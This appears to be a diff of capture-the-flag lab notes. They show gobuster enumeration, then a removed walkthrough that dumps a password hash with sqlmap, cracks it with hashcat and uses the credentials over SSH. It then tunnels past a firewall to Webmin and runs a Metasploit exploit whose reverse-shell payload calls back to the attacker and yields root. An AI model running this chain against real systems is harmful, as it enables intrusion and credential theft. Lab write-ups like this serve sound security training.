+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 312] [--> http://10.10.223.65/admin/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.223.65/css/]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.223.65/js/]
+/config               (Status: 301) [Size: 313] [--> http://10.10.223.65/config/]
+/ai                   (Status: 301) [Size: 309] [--> http://10.10.223.65/ai/]
+/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.223.65/squirrelmail/]
+/server-status        (Status: 403) [Size: 277]
+Progress: 220560 / 220561 (100.00%)
+===============================================================
+Finished
+===============================================================
 
-┌─[✗]─[user@parrot]─[~/Desktop]
-└──╼ $sqlmap -r requests.txt --dbms-mysql --dump
-        ___
-       __H__
- ___ ___[']_____ ___ ___  {1.8.3#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [']_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-Table: users
-[1 entry]
-+------------------------------------------------------------------+----------+
-| pwd                                                              | username |
-+------------------------------------------------------------------+----------+
-| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
-+------------------------------------------------------------------+----------+
+#interesting found squirrel mail dir as well as /admin
 
-added hash to hash.txt file and performed
-
-hashcat -m 1400 -a 0 hash.txt rockyou.txt on it to reveal 
-
-PW for agent47 = videogamer124
-
-used the creds to SSH into the machine ssh agent47@10.10.231.54
-
-once in ss -tulpin showed a connection on port 10000 which was blocked by an external firewall
-
-ssh -L 10000:localhost:10000  agent47@10.10.231.54 was used to establish a local tunnel to bypass the firewall and get onto the CMS on the parot machine
-
-from there after establishing that tunnel I went to the web browser and did 127.0.0.1:10000 to loginto the CMS with agent47's creds
-
-looking through webmin's sys info page we see it is running version 1.580
-
-[msf](Jobs:0 Agents:0) >> search type:exploit webmin
-Matching Modules
-================
-
-   #  Name                                           Disclosure Date  Rank       Check  Description
-   -  ----                                           ---------------  ----       -----  -----------
-   0  exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
-   1  exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
-   2  exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
-   3  exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
-   4  exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
-   5  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
-
-
-the first module for common gateway interface RCI has the following description when I type "info 0"
-
-
-Description:
-  This module exploits an arbitrary command execution vulnerability in Webmin
-  1.580. The vulnerability exists in the /file/show.cgi component and allows an
-  authenticated user, with access to the File Manager Module, to execute arbitrary
-  commands with root privileges. The module has been tested successfully with Webmin
-  1.580 over Ubuntu 10.04.
-
-allowing us to escalate privileges to root sounds pretty good
-
-use 0 
-
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> unset all
-Unsetting datastore...
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> set LHOST tun0
-LHOST => 10.23.80.154
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> set RHOST 127.0.1.1
-RHOST => 127.0.1.1
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> set ssl false
-[!] Changing the SSL option's value may require changing RPORT!
-ssl => false
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> set username agent47
-username => agent47
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> set password videogamer124
-password => videogamer124
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> unset RHOST
-Unsetting RHOST...
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> set RHOSTS 127.0.0.1
-RHOSTS => 127.0.0.1
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> run -j
-
-[-] Exploit failed: A payload has not been selected.
-[*] Exploit completed, but no session was created.
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> set payload cmd/unix/reverse
-payload => cmd/unix/reverse
-[msf](Jobs:0 Agents:0) exploit(unix/webapp/webmin_show_cgi_exec) >> run -j
-
-[*] Started reverse TCP double handler on 10.23.80.154:4444 
-[*] Attempting to login...
-[+] Authentication successful
-[+] Authentication successful
-[*] Attempting to execute the payload...
-[+] Payload executed successfully
-[*] Accepted the first client connection...
-[*] Accepted the second client connection...
-[*] Command: echo XPO8E6SIkUfU3Zsc;
-[*] Writing to socket A
-[*] Writing to socket B
-[*] Reading from sockets...
-[*] Reading from socket B
-[*] B: "XPO8E6SIkUfU3Zsc\r\n"
-[*] Matching...
-[*] A is input...
-[*] Command shell session 1 opened (10.23.80.154:4444 -> 10.10.165.99:40836) at 2025-04-17 20:48:53 +0000
-
-ls
-ACLEditor.class
-ACLEntry.class
-ACLWindow.class
-AttributeEditor.class
-AttributesWindow.class
-BorderPanel.class
-BorderPanel.java
-CHANGELOG
-
-
-#UPGRADING TO METERPRETER
-
-[msf](Jobs:0 Agents:1) exploit(unix/webapp/webmin_show_cgi_exec) >> sessions
-
-Active sessions
-===============
-
-  Id  Name  Type            Information  Connection
-  --  ----  ----            -----------  ----------
-  2         shell cmd/unix               10.23.80.154:4444 -> 10.10.165.99:40848 (127.0.0.1)
-
-[msf](Jobs:0 Agents:1) exploit(unix/webapp/webmin_show_cgi_exec) >> session -u 2
-[-] Unknown command: session
-[msf](Jobs:0 Agents:1) exploit(unix/webapp/webmin_show_cgi_exec) >> sessions -u 2
-[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]
-
-[*] Upgrading session ID: 2
-[*] Starting exploit/multi/handler
-[*] Started reverse TCP handler on 10.23.80.154:4433 
-[*] Command stager progress: 100.00% (773/773 bytes)
-[msf](Jobs:1 Agents:1) exploit(unix/webapp/webmin_show_cgi_exec) >> sessions 2
-[*] Starting interaction with 2...
-
-ls
-ACLEditor.class
-ACLEntry.class
-ACLWindow.class
-AttributeEditor.class
-AttributesWindow.class
-BorderPanel.class
-
-
-pwd
-/usr/share/webmin/file/
-getuid
-sh: 15: getuid: not found
-cd /root
-ls     
-root.txt
-cat root.txt
-a4b945830144bdd71908d12d902adeee
